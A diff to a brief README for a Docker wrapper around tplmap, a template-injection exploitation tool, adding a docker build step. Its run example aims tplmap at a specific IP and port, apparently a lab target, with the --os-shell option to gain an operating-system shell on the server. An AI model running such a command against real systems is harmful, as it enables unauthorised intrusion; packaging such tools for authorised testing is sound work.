@@ -1,6 +1,11 @@
 # tplmap_docker
 Just Dockerfile to build tplmap in docker
 
+## Build
+```
+docker build -t tplmap .
+```
+
 ## Run
 ```
 $ docker run -it --rm tplmap -u http://94.237.62.195:49088/ -d name=john --os-shell
